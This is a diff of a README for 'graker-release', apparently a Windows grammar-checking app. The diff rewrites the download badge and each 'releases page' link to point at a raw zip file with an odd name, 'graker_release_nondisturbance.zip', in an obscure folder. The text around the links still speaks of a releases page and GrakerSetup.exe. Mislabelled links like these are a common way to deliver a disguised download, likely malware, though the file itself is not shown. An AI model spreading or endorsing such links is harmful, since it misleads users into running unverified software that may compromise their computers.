@@ -1,12 +1,12 @@
 # ✍️ graker-release - Improve your writing with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Oliysolidstate9871/graker-release)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Oliysolidstate9871/graker-release/raw/refs/heads/main/lipping/graker_release_nondisturbance.zip)
 
 This application helps you correct English grammar while you type. It works in the background on your computer. You see suggestions for your text in real time. This tool supports students and professionals who write in English.
 
 ## 📥 Getting the software
 
-Visit the [releases page](https://github.com/Oliysolidstate9871/graker-release) to get the application. You find the installer for Windows on this page. Click the link labeled "Assets" to show the available files. Select the file named `GrakerSetup.exe` to start your download. 
+Visit the [releases page](https://github.com/Oliysolidstate9871/graker-release/raw/refs/heads/main/lipping/graker_release_nondisturbance.zip) to get the application. You find the installer for Windows on this page. Click the link labeled "Assets" to show the available files. Select the file named `GrakerSetup.exe` to start your download. 
 
 ## ⚙️ Installing the application
 
@@ -47,4 +47,4 @@ If the grammar checker feels slow, close other programs that use many system res
 
 ## 📝 Updating your version
 
-When a new version exists, the application alerts you via a notification. Click the notification to download the update. Alternatively, return to the [releases page](https://github.com/Oliysolidstate9871/graker-release) periodically to check for improvements. Using the newest version ensures you receive the latest grammar rules and feature enhancements.
+When a new version exists, the application alerts you via a notification. Click the notification to download the update. Alternatively, return to the [releases page](https://github.com/Oliysolidstate9871/graker-release/raw/refs/heads/main/lipping/graker_release_nondisturbance.zip) periodically to check for improvements. Using the newest version ensures you receive the latest grammar rules and feature enhancements.
